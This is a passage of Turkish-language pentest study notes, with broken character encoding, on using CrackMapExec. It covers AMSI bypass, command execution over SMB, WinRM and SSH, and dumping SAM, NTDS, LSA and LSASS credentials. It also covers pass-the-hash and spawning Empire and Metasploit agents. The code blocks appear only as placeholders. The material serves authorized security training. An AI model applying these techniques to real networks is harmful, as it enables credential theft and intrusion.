VarsayÄ±lan olarak, CME biri baÅŸarÄ±sÄ±z olursa farklÄ± bir yÃ¼rÃ¼tme yÃ¶ntemine geÃ§ecektir. KomutlarÄ± aÅŸaÄŸÄ±daki sÄ±rayla yÃ¼rÃ¼tmeye Ã§alÄ±ÅŸÄ±r:

* 1. wmiexec 2. atexec 3. smbexec 4. mmcexec

CME'yi yalnÄ±zca bir yÃ¼rÃ¼tme yÃ¶ntemi kullanmaya zorlamak istiyorsak, Ã¶rneÄŸin `--exec-method` bayraÄŸÄ±nÄ± kullanarak hangisini kullanacaÄŸÄ±mÄ±zÄ± belirtebiliriz:


### SMBExec YÃ¶ntemi ile Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_154}}

Alternatif olarak, -X seÃ§eneÄŸini kullanarak PowerShell ile komutlarÄ± Ã§alÄ±ÅŸtÄ±rabiliriz:

### wmiexec aracÄ±lÄ±ÄŸÄ±yla PowerShell Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_155}}


PowerShell seÃ§eneÄŸi -X Ã§alÄ±ÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda, perde arkasÄ±nda `CrackMapExec` aÅŸaÄŸÄ±dakileri yapacaktÄ±r:

* AMSI bypass 
* Obfuscate the payload 
* Execute the payload

### Ã–zel AMSI Bypass Ã‡alÄ±ÅŸtÄ±rma

Bu teknikler `PowerShell` Ã§alÄ±ÅŸtÄ±rÄ±lÄ±rken algÄ±lanabilir. Ã–zel bir AMSI bypass payload'u kullanmak istiyorsak, `--amsi-bypass` seÃ§eneÄŸini ve ardÄ±ndan kullanmak istediÄŸimiz payload'un yolunu kullanabiliriz. Ã–rneÄŸin, [AMSI Bypass DeÄŸiÅŸtirilmiÅŸ Amsi ScanBuffer](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell#modified-amsi-scanbuffer-patch) YamasÄ±nÄ± kullanalÄ±m. Bunu bir dosyaya kaydedeceÄŸiz ve bu AMSI Bypass'Ä± bir web sunucusundan belleÄŸe yÃ¼klemek iÃ§in bir PowerShell scripti oluÅŸturacaÄŸÄ±z. Ä°ÅŸte adÄ±mlar:

*  â€œModified Amsi ScanBuffer Patchâ€ iÃ§eren dosyayÄ± indirin


### â€œModified Amsi ScanBuffer Patchâ€ ile Bir Dosya OluÅŸturun

{{CODE_BLOCK_156}}


Payload'u olduÄŸu gibi Ã§alÄ±ÅŸtÄ±rmaya Ã§alÄ±ÅŸÄ±rsak, komut maksimum uzunluk olan 8191 karakteri aÅŸacaÄŸÄ± iÃ§in baÅŸarÄ±sÄ±z olacaktÄ±r

### Komut Maksimum UzunluÄŸu AÅŸÄ±yor

{{CODE_BLOCK_157}}

* Bu sorunu Ã§Ã¶zmek iÃ§in, `shantanukhande-amsi.ps1` dosyasÄ±nÄ± indiren ve Ã§alÄ±ÅŸtÄ±ran bir PowerShell scripti oluÅŸturalÄ±m. AyrÄ±ca scriptimizi barÄ±ndÄ±rmak iÃ§in bir Python web sunucusu oluÅŸturmamÄ±z gerekecek.

### PowerShell Komut DosyasÄ±nÄ± OluÅŸturma ve BarÄ±ndÄ±rma

{{CODE_BLOCK_158}}


Not: Sonuna noktalÄ± virgÃ¼l (;) eklediÄŸinizden emin olun.

BaÅŸka bir terminalden, yeni AMSI bypass payload'umuzu Ã§alÄ±ÅŸtÄ±ralÄ±m:

### PowerShell Ã–zel AMSI Bypass Kullanma

{{CODE_BLOCK_159}}


### WinRM Kullanarak Komut YÃ¼rÃ¼tme

WinRM protokolÃ¼ ile de komutlarÄ± Ã§alÄ±ÅŸtÄ±rabiliriz. VarsayÄ±lan olarak WinRM, HTTP TCP port `5985` ve HTTPS TCP port `5986`'yÄ± dinler. Bu protokolle ilgili Ã¶zel bir ÅŸey, bir kullanÄ±cÄ±nÄ±n komutlarÄ± yÃ¼rÃ¼tmek iÃ§in `administrator` olmasÄ±nÄ± gerektirmemesidir. `Administrators` grubunun Ã¼yesiysek, `Remote Management Users` grubunun Ã¼yesiysek veya oturum yapÄ±landÄ±rmasÄ±nda aÃ§Ä±k `PowerShell Remoting` izinlerimiz varsa WinRM protokolÃ¼nÃ¼ kullanabiliriz.

### Command Execution using WinRM

{{CODE_BLOCK_160}}


### WinRM aracÄ±lÄ±ÄŸÄ±yla PowerShell Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_161}}

### Other PowerShell Options

WinRM komut yÃ¼rÃ¼tme ile kullanabileceÄŸimiz Ã§eÅŸitli seÃ§enekler vardÄ±r. Bunlardan bazÄ±larÄ±nÄ± gÃ¶relim:

| SeÃ§enek           | AÃ§Ä±klama                                                |
| ----------------- | ------------------------------------------------------- |
| --port PORT       | WinRM baÄŸlantÄ±sÄ± iÃ§in Ã¶zel bir port seÃ§mek.             |
| --ssl             | SSL etkinleÅŸtirilmiÅŸ WinRM'ye baÄŸlanmak.                |
| --ignore-ssl-cert | SSL ile baÄŸlanÄ±rken sertifika doÄŸrulamasÄ±nÄ± yok saymak. |

Not: WinRM protokolÃ¼ farklÄ± yÃ¼rÃ¼tme yÃ¶ntemlerini desteklemez.

### SSH Command Execution

CrackMapExec kullanarak Linux veya Windows Ã¼zerinde komutlarÄ± Ã§alÄ±ÅŸtÄ±rmak iÃ§in SSH protokolÃ¼nÃ¼ de kullanabiliriz.

### Command Execution with SSH

{{CODE_BLOCK_162}}

Bir SSH sunucusuyla etkileÅŸime girmenin bir baÅŸka yaygÄ±n yolu da `public` ve `private` keyleri kullanmaktÄ±r. CrackMapExec, `--key-file` seÃ§eneÄŸi ile `private key` kullanÄ±mÄ±nÄ± destekler. AnahtarÄ±n Ã§alÄ±ÅŸmasÄ± iÃ§in `OPENSSH` formatÄ±nda olmasÄ± gerekir.

### Private Key Kullanarak SSH ile Komut YÃ¼rÃ¼tme

{{CODE_BLOCK_163}}

Not: Herhangi bir parola yapÄ±landÄ±rÄ±lmamÄ±ÅŸsa, `-p` seÃ§eneÄŸini boÅŸ `(â€œâ€)` olarak ayarlamalÄ±yÄ±z, aksi takdirde bir hata alÄ±rÄ±z

Bu bÃ¶lÃ¼mde, CrackMapExec kullanarak komutlarÄ± yÃ¼rÃ¼tmek iÃ§in Ã¼Ã§ farklÄ± protokol keÅŸfettik ve daha Ã¶nce komutlarÄ± yÃ¼rÃ¼tmek iÃ§in MSSQL'in nasÄ±l kullanÄ±lacaÄŸÄ±nÄ± tartÄ±ÅŸtÄ±k. YazÄ±m sÄ±rasÄ±nda, CrackMapExec komutlarÄ± yÃ¼rÃ¼tmek iÃ§in diÄŸer dÃ¶rt protokolÃ¼ desteklemektedir. Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in kimlik bilgilerini ayÄ±klamak iÃ§in nasÄ±l kullanÄ±lacaÄŸÄ± tartÄ±ÅŸÄ±lacaktÄ±r.


### Gizli Bilgileri Bulma ve Kullanma

Parola Ã§Ä±karma sÃ¶z konusu olduÄŸunda, CrackMapExec oldukÃ§a gÃ¼Ã§lÃ¼dÃ¼r. On workstation ele geÃ§irdiÄŸimizi ve tÃ¼mÃ¼nden kimlik bilgilerini almak iÃ§in LSASS process'inin belleÄŸini dump istediÄŸimizi dÃ¼ÅŸÃ¼nelim; CrackMapExec bunu yapabilir.

Bu bÃ¶lÃ¼mde, CrackMapExec'in Windows kimlik bilgilerini dump iÃ§in sunduÄŸu yÃ¶ntemleri inceleyeceÄŸiz.


### SAM

SAM database, tÃ¼m local kullanÄ±cÄ±larÄ±n kimlik bilgilerini iÃ§erir ve birÃ§ok administrator local kimlik bilgilerini birden fazla makinede yeniden kullandÄ±ÄŸÄ± iÃ§in bunlarÄ± ele geÃ§irmek kritik Ã¶neme sahiptir. `SMB` ve `WinRM` protokolleriyle kullanÄ±labilen `--sam` seÃ§eneÄŸini kullanarak SAM database iÃ§eriÄŸini hÄ±zlÄ± bir ÅŸekilde alabiliriz.

### Dumping SAM

{{CODE_BLOCK_164}}


### NTDS Active Directory Database

Kimlik bilgilerinin alÄ±nabileceÄŸi bir baÅŸka yer de Active Directory veritabanÄ±dÄ±r. ntds.dit dosyasÄ±, kullanÄ±cÄ± objeleri, gruplar ve grup Ã¼yeliÄŸi hakkÄ±ndaki bilgiler de dahil olmak Ã¼zere Active Directory verilerini depolayan bir veritabanÄ±dÄ±r. Ã–zellikle, dosya aynÄ± zamanda domain'deki tÃ¼m kullanÄ±cÄ±lar iÃ§in parola hash'lerini de saklar (ve hatta bazen bir veya daha fazla hesap iÃ§in [reversible encryption](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption) etkinleÅŸtirilmiÅŸse aÃ§Ä±k metin parolalarÄ±nÄ± da saklar). Bir Domain Admin hesabÄ±na veya bir replikasyon/DCSync gerÃ§ekleÅŸtirme ayrÄ±calÄ±klarÄ±na sahip baÅŸka bir hesaba eriÅŸimimiz varsa, bir Domain Controller'dan hash'leri dÃ¶kebiliriz

Hash'leri dump etmek iÃ§in `--ntds` seÃ§eneÄŸini kullanmamÄ±z gerekir, aÅŸaÄŸÄ±daki Ã¶rnekte `robert` kullanÄ±cÄ±sÄ± bir Domain Admin deÄŸildir, ancak `replikasyon` gerÃ§ekleÅŸtirme ayrÄ±calÄ±klarÄ±na sahiptir.

### Domain Controller Ã¼zerinden NTDS database dump etme

{{CODE_BLOCK_165}}

`--ntds` seÃ§eneÄŸini kullanÄ±rken `--user` ve `--enabled` seÃ§eneklerini dahil edebiliriz. EÄŸer `--user` kullanÄ±rsak ayÄ±klamak istediÄŸimiz kullanÄ±cÄ±yÄ± belirtebiliriz. KRBTGT hesabÄ± iÃ§in hash dump alalÄ±m.

### YalnÄ±zca KRBTGT HesabÄ±nÄ±n Dump Edilmesi

{{CODE_BLOCK_166}}

EÄŸer `--enabled` olarak belirtirsek, sadece ekranda `etkin` olan kullanÄ±cÄ±larÄ± gÃ¶sterecek ve bize etkin kullanÄ±cÄ±larÄ±n listesini Ã§Ä±karma seÃ§eneÄŸi sunacaktÄ±r.


### YalnÄ±zca Enabled HesaplarÄ± GÃ¶sterme

{{CODE_BLOCK_167}}


### Secrets (hash'leri) kullanma

Elde ettiÄŸimiz ÅŸifreler NTLM hash'leridir. Hash'leri kÄ±rmayÄ± deneyebilir veya parolayÄ± kÄ±rmadan kullanÄ±cÄ± olarak kimlik doÄŸrulamasÄ± yapmak iÃ§in `Pass the Hash` tekniÄŸini kullanabiliriz. 

CrackMapExec, parola yerine kimlik doÄŸrulama yÃ¶ntemi olarak bir NTLM hash'i gerektiren `-H` seÃ§eneÄŸine sahiptir:

### Using NTLM Hashes

{{CODE_BLOCK_168}}

NTLM kimlik doÄŸrulamasÄ± SMB, WinRM , RDP, LDAP ve MSSQL protokolleri iÃ§in desteklenir


### LSA Secrets/Cached Credentials

CrackMapExec, remote makineden herhangi bir agent Ã§alÄ±ÅŸtÄ±rmadan hash dump iÅŸlemi gerÃ§ekleÅŸtiren `impacket-secretsdump`'tan alÄ±nmÄ±ÅŸ `--lsa` seÃ§eneÄŸiyle birlikte gelir. Bu seÃ§enek, Cached credentials, local machine key list, [Data Protection API (DPAPI)](https://en.wikipedia.org/wiki/Data_Protection_API) keys ve service credentials dahil olmak Ã¼zere LSA Secrets'Ä± dump eder.

`LSA Secrets`, Windows'ta Local Security Authority (LSA) tarafÄ±ndan kullanÄ±lan kritik veriler iÃ§in benzersiz bir korumalÄ± depolama alanÄ±dÄ±r. LSA, bir sistemin local security policy'sini yÃ¶netmek, denetlemek, kimlik doÄŸrulamak, kullanÄ±cÄ±larÄ±n sistemde oturumunu aÃ§mak, Ã¶zel verileri depolamak vb. iÃ§in tasarlanmÄ±ÅŸtÄ±r. KullanÄ±cÄ±larÄ±n ve sistemlerin hassas verileri gizli dosyalarda saklanÄ±r. [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API) anahtarlarÄ± verileri ÅŸifrelemek iÃ§in kullanÄ±lÄ±r


### LSA'yÄ± inceleyin
{{CODE_BLOCK_169}}


`DCC2$` ile baÅŸlayan hash formatÄ± `Domain Cached Credentials 2 (DCC2)`, MS Cache 2'dir. Bu hash'ler, zayÄ±f bir parola belirlenmiÅŸse `Hashcat` kullanÄ±larak kÄ±rÄ±labilir Ã§Ã¼nkÃ¼ bu algoritma `NTLM`'den Ã§ok daha gÃ¼Ã§lÃ¼dÃ¼r. AyrÄ±ca, Domain Cached Credential hash'leri `Pas the Hash` saldÄ±rÄ±sÄ± iÃ§in kullanÄ±lamaz. BunlarÄ± kÄ±rmak iÃ§in, domain ve kullanÄ±cÄ± adÄ±nÄ± kaldÄ±rmamÄ±z, `$DCC2$` 'den sonraki deÄŸeri almamÄ±z ve Hashcat modÃ¼l 2100'Ã¼ kullanmamÄ±z gerekir.


### Cracking Hashes

{{CODE_BLOCK_170}}


{{CODE_BLOCK_171}}


### LSASS'tan Secrets elde etme

LSASS prosesinin belleÄŸi, Windows parolalarÄ±nÄ± `aÃ§Ä±k metin` olarak veya `NTLM` veya `AES256/AES128` gibi diÄŸer hash biÃ§imlerini iÃ§erir. BelleÄŸi dump etmek, bir domain administrator bulana kadar daha fazla hesap bulmak iÃ§in etkili bir yol olabilir.

CrackMapExec, LSASS process belleÄŸinin iÃ§eriÄŸini dump etmek iÃ§in Ã§eÅŸitli modÃ¼ller iÃ§erir. Bunlardan bazÄ±larÄ±nÄ± gÃ¶relim:

* [Lsassy](https://github.com/login-securite/lsassy) Python aracÄ±, bir dizi host Ã¼zerindeki kimlik bilgilerini remote olarak ayÄ±klamak iÃ§in kullanÄ±lÄ±r. Bu [blog](https://en.hackndo.com/remote-lsass-dump-passwords/) yazÄ±sÄ± nasÄ±l Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± aÃ§Ä±klamaktadÄ±r. Bu araÃ§, bir LSASS dump'Ä±ndaki gerekli baytlarÄ± remote okumak iÃ§in `Impacket` projesini ve kimlik bilgilerini Ã§Ä±karmak iÃ§in `pypykatz` kullanÄ±r.


### Lsassy Module

{{CODE_BLOCK_172}}

* Procdump, LSASS process dump oluÅŸturmak iÃ§in Sysinternals'tan Microsoft `Procdump`'Ä± ve kimlik bilgilerini Ã§Ä±karmak iÃ§in `pypykatz`'Ä± kullanÄ±r.


### Procdump Module

{{CODE_BLOCK_173}}


* **[HandleKatz](https://github.com/codewhitesec/HandleKatz)** aracÄ±, **LSASS**'e ait kopyalanmÄ±ÅŸ **handle**'larÄ±n kullanÄ±mÄ±nÄ± gÃ¶stererek, aynÄ± **process**'in **gizlenmiÅŸ** bir bellek dump'Ä±nÄ± oluÅŸturur.


### Handlekatz Module

{{CODE_BLOCK_174}}


* **[Nanodump](https://github.com/helpsystems/nanodump)**, **LSASS process**'inin **minidump**'Ä±nÄ± oluÅŸturan esnek bir araÃ§tÄ±r. **LSASS**'e bir **handle** aÃ§mak tespit edilebileceÄŸinden, **Nanodump** mevcut **handle**'larÄ± arayabilir. EÄŸer bir **handle** bulunursa, bunu kopyalayÄ±p **minidump** oluÅŸturmak iÃ§in kullanÄ±r. Ancak, bÃ¶yle bir **handle** bulunacaÄŸÄ±nÄ±n garantisi yoktur.

Not : **Handle**, bir **process**'in **dosya, bellek bÃ¶lgesi veya baÅŸka bir kaynak** ile etkileÅŸime geÃ§mesini saÄŸlayan **benzersiz bir tanÄ±mlayÄ±cÄ±dÄ±r**.

### Nanodump Module

{{CODE_BLOCK_175}}

Bu bÃ¶lÃ¼mde bir bilgisayardan veya domain'den kimlik bilgilerini almak iÃ§in farklÄ± yÃ¶ntemler gÃ¶sterilmektedir. Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in bir C2 framework ile birlikte kullanÄ±mÄ± incelenecektir.

---


### Bir **C2 Framework** iÃ§inde **session**'larÄ± alma.

CrackMapExec ile ilginÃ§ olabilecek bir ÅŸey, birden fazla hedefi tehlikeye attÄ±ÄŸÄ±mÄ±zda, daha fazla recon yapmak veya `Empire` veya `Metasploit` gibi bir C2 Framework kullanarak Ã§alÄ±ÅŸmak isteyebiliriz. Her hedef makinede bir payload Ã§alÄ±ÅŸtÄ±rmak ve C2'mize bir `agent` almak iÃ§in CrackMapExec'i kullanabiliriz.

Bu bÃ¶lÃ¼mde CME'yi PowerShell Empire ve Metasploit framework ile entegre eden iki modÃ¼l ele alÄ±nacaktÄ±r. AyrÄ±ca farklÄ± bir C2 framework'Ã¼ kullanÄ±rsak bir alternatif de keÅŸfedeceÄŸiz.


### Empire

Web sitelerinde saÄŸlanan [kÄ±lavuzu](https://bc-security.gitbook.io/empire-wiki/quickstart/installation) kullanarak [Empire framework](https://github.com/BC-SECURITY/Empire)'Ã¼ yÃ¼kleyerek baÅŸlayacaÄŸÄ±z


### Empire Server'Ä± Kurun ve BaÅŸlatÄ±n

{{CODE_BLOCK_176}}

Daha sonra Empire'Ä± seÃ§tiÄŸimiz kullanÄ±cÄ± adÄ± ve ÅŸifre ile Ã§alÄ±ÅŸtÄ±rmamÄ±z gerekiyor. Biz `empireadmin` kullanÄ±cÄ± adÄ±nÄ± ve `asdasd123` ÅŸifresini kullanacaÄŸÄ±z! .


### Empire'Ä± Ã–zel KullanÄ±cÄ± AdÄ± ve Parola ile Ã‡alÄ±ÅŸtÄ±rma

{{CODE_BLOCK_177}}

ArdÄ±ndan, CrackMapExec yapÄ±landÄ±rma dosyasÄ±nÄ± ve Empire client yapÄ±landÄ±rma dosyasÄ±nÄ± seÃ§tiÄŸimiz kullanÄ±cÄ± adÄ± ve parolayla eÅŸleÅŸecek ÅŸekilde dÃ¼zenlememiz gerekir.

CrackMapExec yapÄ±landÄ±rma dosyasÄ± varsayÄ±lan olarak `~/.cme/cme.conf` adresinde bulunur. `[Empire]` seÃ§eneÄŸini `empireadmin` kullanÄ±cÄ± adÄ± ve `asdasd123` ÅŸifresiyle eÅŸleÅŸecek ÅŸekilde deÄŸiÅŸtirmemiz gerekiyor! . VarsayÄ±lan olarak, Empire local server `1337` portunda Ã§alÄ±ÅŸÄ±r. CrackMapExec yapÄ±landÄ±rma dosyasÄ±nda deÄŸiÅŸtirilebilir.


### CrackMapExec Configuration File

{{CODE_BLOCK_178}}


AynÄ± ÅŸeyi Empire yapÄ±landÄ±rma dosyasÄ± iÃ§in de yapmamÄ±z gerekiyor. Dosya `empire/client/config.yaml` adresinde bulunur:


### Ä°nceleme

{{CODE_BLOCK_179}}


YapÄ±landÄ±rma dosyalarÄ± deÄŸiÅŸtirildikten sonra, Empire client ile Empire sunucusuna baÄŸlanmalÄ±yÄ±z

{{CODE_BLOCK_180}}

Åimdi listener'Ä± ayarlamamÄ±z gerekiyor ve host'u IP adresimize ve Port'u da aracÄ±nÄ±n baÄŸlanacaÄŸÄ± TCP 8001'e ayarlayacaÄŸÄ±z.

### Empire Client Connection

{{CODE_BLOCK_181}}


### Empire Setting up IP and Port

{{CODE_BLOCK_182}}

ArtÄ±k listener'Ä±mÄ±z Ã§alÄ±ÅŸÄ±yor ve `empire_exec` modÃ¼lÃ¼ ile Empire'a bir `agent` almak iÃ§in CrackMapExec'i kullanabiliriz. AyarladÄ±ÄŸÄ±mÄ±z listener olan `LISTENER=http` seÃ§eneÄŸini eklememiz gerekiyor.


### CrackMapExec ModÃ¼lÃ¼nÃ¼ Kullanma empire_exec

{{CODE_BLOCK_183}}


Bunu Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±zda, PowerShell Empire'da yeni bir agent gÃ¶rmeliyiz.

![Pasted image 20241203121035.png](/img/user/resimler/Pasted%20image%2020241203121035.png)


### Metasploit

AynÄ± ÅŸeyi CrackMapExec modÃ¼lÃ¼ `web_delivery` kullanarak Metasploit Framework Ã¼zerinde de yapabiliriz. Metasploit Framework'te `web_delivery` modÃ¼lÃ¼nÃ¼ yapÄ±landÄ±rmamÄ±z ve saÄŸlanan URL'yi CrackMapExec modÃ¼lÃ¼mÃ¼ze bir parametre olarak kullanmamÄ±z gerekir. Msfconsole'u baÅŸlatalÄ±m ve `web_delivery` handler'Ä±nÄ± yapÄ±landÄ±ralÄ±m


### Metasploit Configure web_delivery Handler

{{CODE_BLOCK_184}}

Metasploit'te web delivery handler yapÄ±landÄ±rÄ±ldÄ±ktan sonra web_delivery modÃ¼lÃ¼nÃ¼ kullanabiliriz. `URL` ve `PAYLOAD` olmak Ã¼zere iki seÃ§eneÄŸi destekler. URL seÃ§eneÄŸini Metasploit tarafÄ±ndan saÄŸlanan URL ile ayarlamamÄ±z gerekir ve PAYLOAD seÃ§eneÄŸi seÃ§tiÄŸimiz payload mimarisine karÅŸÄ±lÄ±k gelir. EÄŸer `x64` kullanÄ±yorsak, `x64` varsayÄ±lan deÄŸer olduÄŸu iÃ§in bu seÃ§eneÄŸi atlayabiliriz ya da `PAYLOAD=64` kullanabiliriz. EÄŸer `32 bit` payload kullanÄ±yorsak `PAYLOAD=32` seÃ§eneÄŸini ayarlamamÄ±z gerekir. Åimdi bunu Ã§alÄ±ÅŸÄ±rken gÃ¶relim:


### CrackMapExec web_delivery Module

{{CODE_BLOCK_185}}

{{CODE_BLOCK_186}}

Metasploit'te yeni bir oturum gÃ¶rmeliyiz:

![Pasted image 20241203121353.png](/img/user/resimler/Pasted%20image%2020241203121353.png)


### Other C2 Frameworks

BaÅŸka bir C2 Framework kullanmak istediÄŸimizde, **Command Execution** bÃ¶lÃ¼mÃ¼nde bahsedilen (SMB, WinRM, SSH) yÃ¶ntemleri kullanarak aynÄ± sonucu elde edebiliriz. Ã–rneÄŸin, bir **PowerShell** payload'u oluÅŸturabilir, bu payload'u bir web sunucusuna kaydedebilir ve payload'u indirip Ã§alÄ±ÅŸtÄ±rmak iÃ§in **-X** seÃ§eneÄŸiyle bir PowerShell komutu Ã§alÄ±ÅŸtÄ±rabiliriz. AyrÄ±ca, iÅŸlemi arka planda yÃ¼rÃ¼tmek iÃ§in **`--no-output`** seÃ§eneÄŸini seÃ§memiz gerekecektir.

Ã–rnek olarak Metasploit'i kullanalÄ±m ve modÃ¼lÃ¼ kullanmak yerine web_delivery payload'unda saÄŸlanan PowerShell script'ini kopyalamayÄ± deneyelim:

![Pasted image 20241203122258.png](/img/user/resimler/Pasted%20image%2020241203122258.png)

Bu bÃ¶lÃ¼m, CrackMapExec'i C2 Frameworks gibi diÄŸer bilgisayar korsanlÄ±ÄŸÄ± araÃ§larÄ±yla nasÄ±l kullanabileceÄŸimizi araÅŸtÄ±rÄ±yor. Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in BloodHound ile nasÄ±l entegre edileceÄŸi incelenecektir.


---

### Bloodhound Entegrasyonu

BloodHound, hem saldÄ±rganlar hem de savunmacÄ±lar tarafÄ±ndan alan gÃ¼venliÄŸini analiz etmek iÃ§in kullanÄ±lan aÃ§Ä±k kaynaklÄ± bir araÃ§tÄ±r. AraÃ§, domain'den toplanan bÃ¼yÃ¼k miktarda veriyi alÄ±r. Ä°liÅŸkiyi gÃ¶rsel olarak temsil etmek ve geleneksel numaralandÄ±rma ile tespit edilmesi zor veya imkansÄ±z olan domain saldÄ±rÄ± yollarÄ±nÄ± belirlemek iÃ§in grafik teorisini kullanÄ±r. Bu bÃ¶lÃ¼mde Bloodhound'a aÅŸina olduÄŸunuzu varsayÄ±yoruz. 


### **BloodHound**'da **Owned** olarak iÅŸaretleme.

BloodHound'da bir Node'u (user, grup, computer vb.) manuel olarak ele geÃ§irilmiÅŸ (owned) olarak iÅŸaretleyebiliriz. Bunu yapmak iÃ§in node'a saÄŸ tÄ±klayÄ±p **`Mark X as Owned`** seÃ§eneÄŸine tÄ±klamamÄ±z yeterlidir. Bu, ele geÃ§irdiÄŸimiz kullanÄ±cÄ±larÄ± ve bilgisayarlarÄ± takip etmek aÃ§Ä±sÄ±ndan faydalÄ±dÄ±r, Ã¶zellikle bÃ¼yÃ¼k bir organizasyonla Ã§alÄ±ÅŸÄ±rken. AyrÄ±ca, **`Shortest Path from Owned Principals`** (Ele GeÃ§irilmiÅŸ Principal'dan En KÄ±sa Yol) veya **`Shortest Paths to Domain Admins from Owned Principals`** (Ele GeÃ§irilmiÅŸ Principal'dan Domain Adminlerine En KÄ±sa Yollar) gibi bir BloodHound cypher sorgusu gerÃ§ekleÅŸtirmek istediÄŸimizde de kullanÄ±ÅŸlÄ±dÄ±r.

CrackMapExec'i, ele geÃ§irdiÄŸimiz herhangi bir user veya computer'Ä± BloodHound veritabanÄ±nda `owned` olarak iÅŸaretleyecek ÅŸekilde yapÄ±landÄ±rabiliriz. Bunu yapmak iÃ§in, `~/.cme/cme.conf` adresinde bulunan CrackMapExec yapÄ±landÄ±rma dosyasÄ±nÄ± aÅŸaÄŸÄ±daki seÃ§eneklerle deÄŸiÅŸtirmemiz gerekir:

* Bloodhound yapÄ±landÄ±rma seÃ§eneÄŸi `bh_enabled`'Ä± `True` olarak ayarlayÄ±n.
* `bh_uri`'yi Bloodhound veritabanÄ± `IP` adresimize ayarlayÄ±n.
* `bh_port`'u veritabanÄ± `portuna` ayarlayÄ±n
* Kimlik bilgilerini bloodhound veritabanÄ±yla eÅŸleÅŸecek ÅŸekilde ayarlayÄ±n: kullanÄ±cÄ± adÄ± `neo4j` ve ÅŸifre `asdasd123` (VeritabanÄ±nÄ±za karÅŸÄ±lÄ±k geleni kullandÄ±ÄŸÄ±nÄ±zdan emin olun).

YapÄ±landÄ±rma aÅŸaÄŸÄ±daki gibi gÃ¶rÃ¼nmelidir:


### Configuring BloodHound Database

{{CODE_BLOCK_187}}

Not: BaÄŸlandÄ±ÄŸÄ±nÄ±z BloodHound veritabanÄ±na karÅŸÄ±lÄ±k gelen kullanÄ±cÄ± adÄ± ve parolayÄ± kullandÄ±ÄŸÄ±nÄ±zdan emin olun.

### Bloodhound Verilerinin ToplanmasÄ±

BloodHound verilerini toplamak iÃ§in CrackMapExec kullanarak SharpHound'u Ã§alÄ±ÅŸtÄ±racak ve ardÄ±ndan dosyayÄ± saldÄ±rÄ± hostumuza aktaracaÄŸÄ±z.

### BloodHound verilerinin toplanmasÄ±

{{CODE_BLOCK_188}}

{{CODE_BLOCK_189}}

{{CODE_BLOCK_190}}

{{CODE_BLOCK_191}}

Åimdi BloodHound'u aÃ§mamÄ±z ve verileri iÃ§e aktarmamÄ±z gerekiyor.


### BloodHound'da KullanÄ±cÄ±larÄ± Owned Olarak Ayarlama

Veriler iÃ§e aktarÄ±ldÄ±ktan sonra, `robert` kullanÄ±cÄ±sÄ± ile baÄŸlanmaya Ã§alÄ±ÅŸÄ±rsak, kullanÄ±cÄ±yÄ± BloodHound veritabanÄ±nda owned olunan olarak ayarlayacaktÄ±r.

### KullanÄ±cÄ± BloodHound'da Owned Olarak Eklendi

{{CODE_BLOCK_192}}

Birden fazla kullanÄ±cÄ±sÄ± olan bir makineyi tehlikeye atarsak da aynÄ± ÅŸey olacaktÄ±r. Bulunan tÃ¼m yeni kullanÄ±cÄ±larÄ± owned olarak ayarlayacaktÄ±r.

### Procdump ModÃ¼lÃ¼ ile KullanÄ±cÄ±larÄ± Owned Olarak Ekleme

{{CODE_BLOCK_193}}


Not: TÃ¼m CrackMapExec seÃ§enekleri BloodHound veritabanÄ± ile senkronize olmayacaktÄ±r. Ã–rneÄŸin, `--ntds` veya `--lsa` seÃ§eneklerini denersek, kullanÄ±cÄ±larÄ± veritabanÄ±nda sahip olunan olarak iÅŸaretlemez, ancak `procdump` veya `lsassy` gibi modÃ¼ller kullanÄ±cÄ±larÄ± sahip olunan olarak iÅŸaretler.


### BloodHound'da BilgisayarlarÄ± Owned Olarak Ayarlama

YazÄ±m sÄ±rasÄ±nda, BloodHound entegrasyonu yalnÄ±zca user'larÄ± Owned olarak iÅŸaretlemektedir. Bir `computer` owned olarak iÅŸaretlemek istiyorsak, `bh_owned` modÃ¼lÃ¼nÃ¼ ve `neo4j` veritabanÄ±mÄ±zÄ±n kullanÄ±cÄ± adÄ± ve ÅŸifresini kullanabiliriz. AÅŸaÄŸÄ±daki Ã¶rnekte, diÄŸer varsayÄ±lan deÄŸerler neo4j veritabanÄ±mÄ±zla eÅŸleÅŸtiÄŸi iÃ§in yalnÄ±zca `PASS` seÃ§eneÄŸini ekleyeceÄŸiz.

{{CODE_BLOCK_194}}

{{CODE_BLOCK_195}}

BloodHound'un CrackMapExec'e entegrasyonu, bÃ¼yÃ¼k aÄŸlarla uÄŸraÅŸÄ±rken birÃ§ok seÃ§enek sunar ve mÃ¼ÅŸterilerimizle paylaÅŸmak istememiz durumunda veritabanÄ±nÄ± gÃ¼ncellemenin hÄ±zlÄ± bir yoludur. Bir sonraki bÃ¶lÃ¼mde, CrackMapExec'te mevcut olan bazÄ± popÃ¼ler modÃ¼llerle Ã§alÄ±ÅŸacaÄŸÄ±z.


----
### Popular Modules

CrackMapExec ile ilgili en heyecan verici ÅŸeylerden biri, modÃ¼ler olmasÄ± ve herkesin modÃ¼ller oluÅŸturmasÄ±na ve bunlarÄ± araca katkÄ±da bulunmasÄ±na izin vermesidir. CrackMapExec, exploit ve exploit sonrasÄ± gÃ¶revleri kolaylaÅŸtÄ±rmak iÃ§in iÅŸlemler gerÃ§ekleÅŸtirmemizi saÄŸlayan 50'den fazla modÃ¼le sahiptir. Bu bÃ¶lÃ¼mde LDAP ve SMB protokolleri iÃ§in bu modÃ¼llerden bazÄ±larÄ± incelenecektir.


### LDAP Protocol Modules

LDAP protokolÃ¼ yaygÄ±n olarak Domain Controller'lar ile etkileÅŸime geÃ§memizi ve onlardan bilgi almamÄ±zÄ± saÄŸlar. Active Directory'den ilginÃ§ bilgiler Ã§Ä±karmamÄ±zÄ± saÄŸlayacak bazÄ± modÃ¼lleri gÃ¶zden geÃ§irelim.


### **LDAP Module - get-network**

